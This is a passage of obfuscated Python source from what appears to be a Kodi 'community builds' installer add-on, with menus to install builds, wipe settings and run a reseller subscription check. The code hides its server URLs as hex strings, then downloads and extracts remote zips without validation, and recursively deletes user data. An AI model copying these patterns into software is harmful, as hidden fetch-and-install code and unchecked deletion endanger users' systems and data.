 i1iiIIi1I = re . compile ( 'videolabel1="(.+?)"' ) . findall ( iiIiI )
 iiI1I1IIi11i1 = re . compile ( 'videolabel2="(.+?)"' ) . findall ( iiIiI )
 i1II1iii1i = re . compile ( 'videolabel3="(.+?)"' ) . findall ( iiIiI )
 OOO0o = re . compile ( 'videolabel4="(.+?)"' ) . findall ( iiIiI )
 iII = re . compile ( 'videolabel5="(.+?)"' ) . findall ( iiIiI )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 II1 = re . compile ( 'author="(.+?)"' ) . findall ( iiIiI )
 oOooOOOoOo = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
 Oo00O0Oo0Oo = re . compile ( 'description="(.+?)"' ) . findall ( iiIiI )
 I1I11i = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( iiIiI )
 O0iI = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( iiIiI )
 Ii1I = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( iiIiI )
 IiiIiiIi = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( iiIiI )
 IiI111111IIII = re . compile ( 'updated="(.+?)"' ) . findall ( iiIiI )
 i1iiIIIi = re . compile ( 'defaultskin="(.+?)"' ) . findall ( iiIiI )
 Oo0o = re . compile ( 'skins="(.+?)"' ) . findall ( iiIiI )
 oOOoOoo0O0 = re . compile ( 'videoaddons="(.+?)"' ) . findall ( iiIiI )
 i1i1ii1111i1i = re . compile ( 'audioaddons="(.+?)"' ) . findall ( iiIiI )
 iIiIii1iIIiii1 = re . compile ( 'programaddons="(.+?)"' ) . findall ( iiIiI )
 ooOo0O0o0 = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( iiIiI )
 o0oo0O = re . compile ( 'sources="(.+?)"' ) . findall ( iiIiI )
 I1iiIII = re . compile ( 'adult="(.+?)"' ) . findall ( iiIiI )
 iIi1I1 = re . compile ( 'guisettings="(.+?)"' ) . findall ( iiIiI )
 if 63 - 63: iIIi1iIIi * i1i1i11IIi . iiIi / OO0O * O000OO0 . OOO00O
 Ooo0 = iiIiIi1 [ 0 ] if ( len ( iiIiIi1 ) > 0 ) else ''
 oooO00o0 = oOOOOOOOoO [ 0 ] if ( len ( oOOOOOOOoO ) > 0 ) else ''
 IIIiIiI11iIi = i1i11I [ 0 ] if ( len ( i1i11I ) > 0 ) else ''
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 o0o00oO0oo000 = II1 [ 0 ] if ( len ( II1 ) > 0 ) else ''
 iiii111II = oOooOOOoOo [ 0 ] if ( len ( oOooOOOoOo ) > 0 ) else ''
 iIIII1iIIii = Oo00O0Oo0Oo [ 0 ] if ( len ( Oo00O0Oo0Oo ) > 0 ) else 'No information available'
 O00O = IiI111111IIII [ 0 ] if ( len ( IiI111111IIII ) > 0 ) else ''
 oO000o = i1iiIIIi [ 0 ] if ( len ( i1iiIIIi ) > 0 ) else ''
 o0Oo = Oo0o [ 0 ] if ( len ( Oo0o ) > 0 ) else ''
 o0O0 = oOOoOoo0O0 [ 0 ] if ( len ( oOOoOoo0O0 ) > 0 ) else ''
 I1I1Iiii1 = i1i1ii1111i1i [ 0 ] if ( len ( i1i1ii1111i1i ) > 0 ) else ''
 i111i1 = iIiIii1iIIiii1 [ 0 ] if ( len ( iIiIii1iIIiii1 ) > 0 ) else ''
 OoOoOo0 = ooOo0O0o0 [ 0 ] if ( len ( ooOo0O0o0 ) > 0 ) else ''
 i1II11II1 = o0oo0O [ 0 ] if ( len ( o0oo0O ) > 0 ) else ''
 II1IIIii = I1iiIII [ 0 ] if ( len ( I1iiIII ) > 0 ) else ''
 iIIIiIi1I1i = iIi1I1 [ 0 ] if ( len ( iIi1I1 ) > 0 ) else 'None'
 OoOOoO0oOo = I1I11i [ 0 ] if ( len ( I1I11i ) > 0 ) else 'None'
 O0ooOOOO0O0 = O0iI [ 0 ] if ( len ( O0iI ) > 0 ) else 'None'
 i1IIi1i1Ii1 = Ii1I [ 0 ] if ( len ( Ii1I ) > 0 ) else 'None'
 Iiio0Oo0oO = IiiIiiIi [ 0 ] if ( len ( IiiIiiIi ) > 0 ) else 'None'
 oOo = IiIi11iI [ 0 ] if ( len ( IiIi11iI ) > 0 ) else 'None'
 i1II1I1Iii1 = I1 [ 0 ] if ( len ( I1 ) > 0 ) else 'None'
 iiI11Iii = IIiI [ 0 ] if ( len ( IIiI ) > 0 ) else 'None'
 O0o0O0 = O0oOOo0o [ 0 ] if ( len ( O0oOOo0o ) > 0 ) else 'None'
 Ii1II1I11i1 = I1III11iiii11i1 [ 0 ] if ( len ( I1III11iiii11i1 ) > 0 ) else 'None'
 oOoooooOoO = ooOo0OoO [ 0 ] if ( len ( ooOo0OoO ) > 0 ) else 'None'
 IIIII1 = i1iiIIi1I [ 0 ] if ( len ( i1iiIIi1I ) > 0 ) else 'None'
 iIi1Ii1i1iI = iiI1I1IIi11i1 [ 0 ] if ( len ( iiI1I1IIi11i1 ) > 0 ) else 'None'
 IIiI1 = i1II1iii1i [ 0 ] if ( len ( i1II1iii1i ) > 0 ) else 'None'
 i1iI1 = OOO0o [ 0 ] if ( len ( OOO0o ) > 0 ) else 'None'
 ii1I1IiiI1ii1i = iII [ 0 ] if ( len ( iII ) > 0 ) else 'None'
 oOooO00o0O = open ( ii11iIi1I , mode = 'w+' )
 oOooO00o0O . write ( 'id="' + str ( video ) + '"\nname="' + i1II1 + '"\nversion="' + iiii111II + '"' )
 oOooO00o0O . close ( )
 o0oO ( '' , '[COLOR=yellow]IMPORTANT:[/COLOR][COLOR=white] Install Instructions[/COLOR]' , '' , 'instructions_2' , 'TOTALXBMC.png' , '' , '' , '' )
 ii1ii1ii ( '[COLOR=yellow]Description:[/COLOR][COLOR=white] This contains important info from the build author[/COLOR]' , 'None' , 'description' , 'BUILDDETAILS.png' , OOoo , i1II1 , o0o00oO0oo000 , iiii111II , iIIII1iIIii , O00O , o0Oo , o0O0 , I1I1Iiii1 , i111i1 , OoOoOo0 , i1II11II1 , II1IIIii )
 if O0ooOOOO0O0 != 'None' :
  IiI1 ( '[COLOR=orange]Update This Build (Latest Update: ' + i1IIi1i1Ii1 + ')[/COLOR]' , O0ooOOOO0O0 , 'update_build' , oOoooo000Oo00 , OOoo , Iiio0Oo0oO , i1II1 , oO000o , iIIIiIi1I1i , i1IIi1i1Ii1 )
 if oOo != 'None' or i1II1I1Iii1 != 'None' or iiI11Iii != 'None' or O0o0O0 != 'None' or Ii1II1I11i1 != 'None' or oOoooooOoO != 'None' :
  o0oO ( '' , '[COLOR=gold]----------------------- VIDEO GUIDES -----------------------[/COLOR]' , 'None' , '' , 'TOTALXBMC.png' , '' , '' , '' )
 if oOo != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] Preview[/COLOR]' , oOo , 'play_video' , 'Video_Preview.png' , OOoo , '' , '' )
 if i1II1I1Iii1 != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IIIII1 + '[/COLOR]' , i1II1I1Iii1 , 'play_video' , 'Video_Guide.png' , OOoo , '' , '' )
 if iiI11Iii != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + iIi1Ii1i1iI + '[/COLOR]' , iiI11Iii , 'play_video' , 'Video_Guide.png' , OOoo , '' , '' )
 if O0o0O0 != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IIiI1 + '[/COLOR]' , O0o0O0 , 'play_video' , 'Video_Guide.png' , OOoo , '' , '' )
 if Ii1II1I11i1 != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + i1iI1 + '[/COLOR]' , Ii1II1I11i1 , 'play_video' , 'Video_Guide.png' , OOoo , '' , '' )
 if oOoooooOoO != 'None' :
  o0oO ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + ii1I1IiiI1ii1i + '[/COLOR]' , oOoooooOoO , 'play_video' , 'Video_Guide.png' , OOoo , '' , '' )
 o0oO ( '' , '[COLOR=gold]----------------------- INSTALL OPTIONS -----------------------[/COLOR]' , 'None' , '' , 'TOTALXBMC.png' , '' , '' , '' )
 if OoOOoO0oOo == 'None' :
  IiI1 ( '[COLOR=gold]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
 if IIII . endswith ( "visibility=premium" ) or IIII . endswith ( "visibility=reseller_private" ) or IIII . endswith ( "visibility=reseller_openelec" ) :
  if ( IIIiIiI11iIi != '' ) and ( IIIiIiI11iIi != 'fail' ) and ( os . path . exists ( IIIiIiI11iIi ) ) :
   if IIII . endswith ( "visibility=reseller_openelec" ) :
    IiI1 ( '[COLOR=lime]Install - THIS WILL WIPE ANY EXISTING KODI SETTINGS[/COLOR]' , OoOOoO0oOo , 'restore_openelec' , oOoooo000Oo00 , OOoo , '' , i1II1 , '' , '' , '' )
   if IIII . endswith ( "visibility=premium" ) or IIII . endswith ( "visibility=reseller_private" ) and not IIII . endswith ( "visibility=reseller_openelec" ) and OoOOoO0oOo != 'None' :
    IiI1 ( '[COLOR=lime]1. Fresh Install:[/COLOR][COLOR=white] This will wipe all existing settings[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'fresh' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]2. Install:[/COLOR][COLOR=white] Keep My Library & Profiles[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'libprofile' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]3. Install:[/COLOR][COLOR=white] Keep My Library Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'library' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]4. Install:[/COLOR][COLOR=white] Keep My Profiles Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'profiles' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
   if IIII . endswith ( "visibility=premium" ) or IIII . endswith ( "visibility=reseller_private" ) and O0ooOOOO0O0 != 'None' :
    IiI1 ( '[COLOR=orange]Update This Build (Latest Update: ' + i1IIi1i1Ii1 + ')[/COLOR]' , O0ooOOOO0O0 , 'update_build' , oOoooo000Oo00 , OOoo , Iiio0Oo0oO , i1II1 , oO000o , iIIIiIi1I1i , i1IIi1i1Ii1 )
  if ( ( IIIiIiI11iIi != '' ) and not os . path . exists ( IIIiIiI11iIi ) and ( IIIiIiI11iIi != 'fail' ) ) :
   OOOo0 = 1
   I1IiI . ok ( "Security check failed, contact box seller" , 'This box cannot be identified as an official' , '[COLOR=lime]' + I1IiiI + '[/COLOR] product. Please contact the' , 'seller you purchased this device from for more details.' )
  if IIIiIiI11iIi == 'fail' :
   OOOo0 = 1
   I1IiI . ok ( "Subscription not paid" , 'The box seller has either opted out of the premium' , 'plan or has unpaid debts to the Community Builders.' , 'Please contact the seller you purchased this device from for more details.' )
  if IIIiIiI11iIi == '' :
   if IIII . endswith ( "visibility=reseller_openelec" ) :
    IiI1 ( '[COLOR=lime]Install - THIS WILL WIPE ANY EXISTING KODI SETTINGS[/COLOR]' , OoOOoO0oOo , 'restore_openelec' , oOoooo000Oo00 , OOoo , '' , i1II1 , '' , '' , '' )
   if IIII . endswith ( "visibility=premium" ) or IIII . endswith ( "visibility=reseller_private" ) and not IIII . endswith ( "visibility=reseller_openelec" ) and OoOOoO0oOo != 'None' :
    IiI1 ( '[COLOR=lime]1. Fresh Install:[/COLOR][COLOR=white] This will wipe all existing settings[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'fresh' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]2. Install:[/COLOR][COLOR=white] Keep My Library & Profiles[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'libprofile' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]3. Install:[/COLOR][COLOR=white] Keep My Library Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'library' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
    IiI1 ( '[COLOR=lime]4. Install:[/COLOR][COLOR=white] Keep My Profiles Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'profiles' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
   if IIII . endswith ( "visibility=premium" ) or IIII . endswith ( "visibility=reseller_private" ) and O0ooOOOO0O0 != 'None' :
    IiI1 ( '[COLOR=orange]Update This Build (Latest Update: ' + i1IIi1i1Ii1 + ')[/COLOR]' , O0ooOOOO0O0 , 'update_build' , oOoooo000Oo00 , OOoo , Iiio0Oo0oO , i1II1 , oO000o , iIIIiIi1I1i , i1IIi1i1Ii1 )
 else :
  IiI1 ( '[COLOR=lime]1. Fresh Install:[/COLOR][COLOR=white] This will wipe all existing settings[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'fresh' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
  IiI1 ( '[COLOR=lime]2. Install:[/COLOR][COLOR=white] Keep My Library & Profiles[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'libprofile' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
  IiI1 ( '[COLOR=lime]3. Install:[/COLOR][COLOR=white] Keep My Library Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'library' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
  IiI1 ( '[COLOR=lime]4. Install:[/COLOR][COLOR=white] Keep My Profiles Only[/COLOR]' , OoOOoO0oOo , 'restore_community' , oOoooo000Oo00 , OOoo , 'profiles' , i1II1 , oO000o , iIIIiIi1I1i , oooO00o0 )
 if OOOo0 == 0 :
  if iIIIiIi1I1i == 'None' :
   pass
  else :
   if not IIII . endswith ( "visibility=reseller_openelec" ) :
    o0oO ( '' , '[COLOR=gold]----------------------- INSTALL PART 2 -----------------------[/COLOR]' , 'None' , '' , 'TOTALXBMC.png' , '' , '' , '' )
    o0oO ( '' , '[COLOR=dodgerblue]Install Step 2:[/COLOR][COLOR=white] Apply guisettings.xml fix[/COLOR]' , iIIIiIi1I1i , 'guisettingsfix' , 'Fix_My_Build.png' , OOoo , '' , '' )
    if 48 - 48: o0OOOoO0 . O00oo0OO0oOOO / o0OOOoO0
def Ooo00o0oOo0O0O ( title , url , mode , iconimage , fanart , updateDesc , description , skins , guisettingslink , updateDate ) :
 OO0OO0OO = I1IiI . yesno ( "Update Pack Details" , updateDesc )
 if OO0OO0OO == 1 :
  oO0ooOO ( i1II1 , url , '' , description , skins , guisettingslink , '' )
  if 7 - 7: II11iII - OO0O . II11iII
  if 53 - 53: o0OOOoO0 % IIiII . OOO00O - OooOooo
def iIIi1IIi ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 OoOoO0OoOOOOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( OoOoO0OoOOOOo ) :
  iiIii1I1Iii = 0
  iiIii1I1Iii += len ( I1iii )
  if 34 - 34: OO % o0OOOoO0 % OooOooo
  if iiIii1I1Iii >= 0 :
   for Ii in I1iii :
    os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
   for i1Ii11II in O0oooo00o0Oo :
    shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
    if 63 - 63: OoOo - I11iii1Ii % iIIi1iIIi % IIiII / O00oo0OO0oOOO / iiiIi1i1I
    if 69 - 69: O000OO0 * II11iII * OOO00O . iIIi1iIIi - i1i1i11IIi
def I11iiIIiI1ii ( ) :
 for I1IiIIi11I1 in glob . glob ( os . path . join ( O0OoO000O0OO , 'xbmc_crashlog*.*' ) ) :
  I11i1I1Ii11 = I1IiIIi11I1
  print I1IiIIi11I1
  os . remove ( I1IiIIi11I1 )
  I1IiI = xbmcgui . Dialog ( )
  I1IiI . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 60 - 60: OooOooo
  if 5 - 5: OoOo - OoOo - OoOo * iiIi
def OOooo ( ) :
 print '############################################################       DELETING PACKAGES             ###############################################################'
 iiiiiII = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( iiiiiII ) :
  iiIii1I1Iii = 0
  iiIii1I1Iii += len ( I1iii )
  if 21 - 21: i1iiI11I / II11iII % iiiIi1i1I
  if iiIii1I1Iii > 0 :
   for Ii in I1iii :
    os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
   for i1Ii11II in O0oooo00o0Oo :
    shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
    if 8 - 8: I11iii1Ii + OooOooo . i1iiI11I % III1i1i
    if 43 - 43: i1i1i11IIi - iIIi1iIIi
def O000O ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 OoOoO0OoOOOOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( OoOoO0OoOOOOo ) :
  iiIii1I1Iii = 0
  iiIii1I1Iii += len ( I1iii )
  if 98 - 98: i1iiI11I + OO % OooOooo + IIiII % OooOooo
  if iiIii1I1Iii >= 0 :
   for Ii in I1iii :
    os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
   for i1Ii11II in O0oooo00o0Oo :
    shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
    if 24 - 24: o0OOOoO0 * OO
    if 40 - 40: iIi1iIiii111 - OooOooo * OooOooo . OooOooo + iiIi
def oo00O00oO000o ( name , addon_id ) :
 iiI111 = 1
 IIiiI = 1
 Oo0 = xbmc . translatePath ( os . path . join ( o0oO0 , addon_id , 'addon.xml' ) )
 o0OOOOO0O = open ( Oo0 , mode = 'r' )
 I1I1IiIi1 = o0OOOOO0O . read ( )
 o0OOOOO0O . close ( )
 oOO0o0oo0 = re . compile ( 'import addon="(.+?)"' ) . findall ( I1I1IiIi1 )
 for oO0o00oo0 in oOO0o0oo0 :
  if not 'xbmc.python' in oO0o00oo0 :
   print 'Script Requires --- ' + oO0o00oo0
   oOo000O = xbmc . translatePath ( os . path . join ( o0oO0 , oO0o00oo0 ) )
   if not os . path . exists ( oOo000O ) :
    iIIooO0o0O0Oo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646570656e64656e6379696e7374616c6c2e7068703f69643d2573'
    IIII = binascii . unhexlify ( iIIooO0o0O0Oo ) % ( oO0o00oo0 )
    iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
    oOooOOOoOo = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
    O0Oi1I1I = re . compile ( 'repo_url="(.+?)"' ) . findall ( iiIiI )
    iiI1I = re . compile ( 'data_url="(.+?)"' ) . findall ( iiIiI )
    IiIiiIIiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( iiIiI )
    I1i1Iiiii = re . compile ( 'repo_id="(.+?)"' ) . findall ( iiIiI )
    IiiIIi = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
    iiii111II = oOooOOOoOo [ 0 ] if ( len ( oOooOOOoOo ) > 0 ) else ''
    O00o0O = O0Oi1I1I [ 0 ] if ( len ( O0Oi1I1I ) > 0 ) else ''
    iIIIiI = iiI1I [ 0 ] if ( len ( iiI1I ) > 0 ) else ''
    O00 = IiIiiIIiI [ 0 ] if ( len ( IiIiiIIiI ) > 0 ) else ''
    i1iiIII1IIiIIII = I1i1Iiiii [ 0 ] if ( len ( I1i1Iiiii ) > 0 ) else ''
    I1iIIII1 = xbmc . translatePath ( os . path . join ( Ooo , IiiIIi + '.zip' ) )
    try :
     downloader . download ( O00o0O , I1iIIII1 , o0OOO )
     I1iii11 ( I1iIIII1 , OO0o , o0OOO )
    except :
     try :
      downloader . download ( O00 , I1iIIII1 , o0OOO )
      I1iii11 ( I1iIIII1 , OO0o , o0OOO )
     except :
      try :
       if not os . path . exists ( oOo000O ) :
        os . makedirs ( oOo000O )
       iiIiI = o00oooO0Oo ( iIIIiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       ooo0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( iiIiI )
       for iII1iii in ooo0O :
        i11i1iiiII = xbmc . translatePath ( os . path . join ( oOo000O , iII1iii ) )
        if addon_id not in iII1iii and '/' not in iII1iii :
         try :
          o0OOO . update ( 0 , "Downloading [COLOR=yellow]" + iII1iii + '[/COLOR]' , '' , 'Please wait...' )
          downloader . download ( iIIIiI + iII1iii , i11i1iiiII , o0OOO )
         except : print "failed to install" + iII1iii
        if '/' in iII1iii and '..' not in iII1iii and 'http' not in iII1iii :
         ooOO0oO0oo00o = iIIIiI + iII1iii
         oOOo0oo0O ( i11i1iiiII , ooOO0oO0oo00o )
      except :
       I1IiI . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=yellow]' + IiiIIi , '[/COLOR]Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
       IIiiI = 0
       iiI111 = 0
    if IIiiI == 1 :
     time . sleep ( 1 )
     o0OOO . update ( 0 , "[COLOR=yellow]" + IiiIIi + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     O0OOO0OOooo00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
     I111iIi1 = binascii . unhexlify ( O0OOO0OOooo00 ) % ( oO0o00oo0 )
     o00oooO0Oo ( I111iIi1 )
 o0OOO . close ( )
 time . sleep ( 1 )
 if 57 - 57: OooOooo . i1iiI11I % OOO00O % iIi1iIiii111 * OooOooo
 if 8 - 8: OooOooo . OOO00O % o0OOOoO0 . OoOo % OoOo . iIi1iIiii111
def I1I11ii ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 OOoOoo00Oo ( buildname + '     v.' + version , '[COLOR=yellow][B]Author:   [/B][/COLOR]' + author + '[COLOR=yellow][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=yellow][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=yellow][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=gold]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'TotalXBMC take no responsibility over what content is included in these builds, it\'s up to the individual who uploads the build to state what\'s included and then the users decision to decide whether or not that content is suitable for them.' )
 if 9 - 9: II11iII * II11iII . oO00OO0oo0 * i1iiI11I
 if 18 - 18: I11iii1Ii . II11iII % OooOooo % iIi1iIiii111
def oo0i1iIIi1II1iiI ( path ) :
 o0OOO . create ( "[COLOR=blue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 31 - 31: O00oo0OO0oOOO % IIiII + i1iiI11I + oO00OO0oo0 * OO
def I1i1I1I11IiiI ( url , dest , dp = None ) :
 if not dp :
  dp = xbmcgui . DialogProgress ( )
  dp . create ( "Speed Test" , "Testing your internet speed..." , ' ' , ' ' )
 dp . update ( 0 )
 I1IiI1iI11 = time . time ( )
 if 2 - 2: i1iiI11I
 try :
  urllib . urlretrieve ( url , dest , lambda iiii1 , OO0o0oO0O000o , I1iI11iii : iI ( iiii1 , OO0o0oO0O000o , I1iI11iii , dp , I1IiI1iI11 ) )
 except :
  pass
  if 78 - 78: III1i1i / II11iII * I11iii1Ii
  if 50 - 50: iiIi - i1iiI11I + iiiIi1i1I % OO - i1iiI11I % III1i1i
 return ( time . time ( ) - I1IiI1iI11 )
 if 58 - 58: O0OoO + i1iiI11I
 if 65 - 65: II11iII - OO % O00oo0OO0oOOO - OooOooo * iIIi1iIIi + iIi1iIiii111
def I1iii11 ( _in , _out , dp = None ) :
 if dp :
  return O0o0O0OO0o ( _in , _out , dp )
  if 54 - 54: OooOooo . o0OOOoO0 % oO00OO0oo0 / iiIi + O0OoO % o0OOOoO0
 return i1ii1IIiI ( _in , _out )
 if 31 - 31: I11iii1Ii * oO00OO0oo0 * iIi1iIiii111 . oO00OO0oo0
 if 12 - 12: OooOooo % O0OoO % i1i1i11IIi . oO00OO0oo0 * i1iiI11I
def i1ii1IIiI ( _in , _out ) :
 try :
  oOOOoo = zipfile . ZipFile ( _in , 'r' )
  oOOOoo . extractall ( _out )
 except Exception , oO0 :
  print str ( oO0 )
  return False
 return True
 if 66 - 66: oO00OO0oo0 * i1iiI11I % iiIi
 if 5 - 5: OooOooo % iiIi
def O0o0O0OO0o ( _in , _out , dp ) :
 oOOOoo = zipfile . ZipFile ( _in , 'r' )
 i1i1i1I = float ( len ( oOOOoo . infolist ( ) ) )
 oOoo000 = 0
 try :
  for OooOo00o in oOOOoo . infolist ( ) :
   oOoo000 += 1
   IiI11i1IIiiI = oOoo000 / i1i1i1I * 100
   dp . update ( int ( IiI11i1IIiiI ) )
   oOOOoo . extract ( OooOo00o , _out )
 except Exception , oO0 :
  print str ( oO0 )
  return False
 return True
 if 60 - 60: OooOooo . iiiIi1i1I % I11iii1Ii % OOO00O % OO0O
def OOOoOo00O ( ) :
 os . remove ( iI111I11I1I1 )
 os . rename ( OOooO0OOoo , iI111I11I1I1 )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 I1IiI . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 33 - 33: i1iiI11I - iIi1iIiii111 * i1i1i11IIi % i1iiI11I + I11iii1Ii . OO0O
 if 56 - 56: oO00OO0oo0 * iIIi1iIIi . o0OOOoO0
def i111i11I1ii ( url ) :
 o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Renaming paths..." , '' , 'Please Wait' )
 for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( url ) :
  for file in I1iii :
   if file . endswith ( ".xml" ) :
    o0OOO . update ( 0 , "Fixing" , file , 'Please Wait' )
    iIIiiIIIi1I = open ( ( os . path . join ( OooOo000OOOOo , file ) ) ) . read ( )
    ooooO0O = iIIiiIIIi1I . replace ( iIiiiI , 'special://home/' )
    Ii = open ( ( os . path . join ( OooOo000OOOOo , file ) ) , mode = 'w' )
    Ii . write ( str ( ooooO0O ) )
    Ii . close ( )
    if 81 - 81: iiiIi1i1I % O00oo0OO0oOOO - OO + oO00OO0oo0 - iiIi
    if 50 - 50: iIi1iIiii111 - oO00OO0oo0 + i1iiI11I / III1i1i - iIi1iIiii111 + O00oo0OO0oOOO
def Iii111Ii1 ( ) :
 III11 = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f4164646f6e5f4669782f6164646f6e6669782e747874'
 Ii1Ii11Iii1i1 = binascii . unhexlify ( III11 )
 iiIiI = o00oooO0Oo ( Ii1Ii11Iii1i1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iiIiI )
 for i1II1 , i1IiII1i1I , oOoooo000Oo00 , OOoo , iIIII1iIIii in ooo0O :
  o0oO ( '' , i1II1 , i1IiII1i1I , 'OSS' , oOoooo000Oo00 , OOoo , '' , iIIII1iIIii )
  if 39 - 39: IIiII
  if 64 - 64: i1iiI11I / III1i1i % O0OoO . iiIi + O0OoO + o0OOOoO0
def Oo00o0O0O ( url ) :
 o0oO ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , 'anime.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , 'audiobooks.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , 'comedy.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , 'comics.png' , '' , '' , '' )
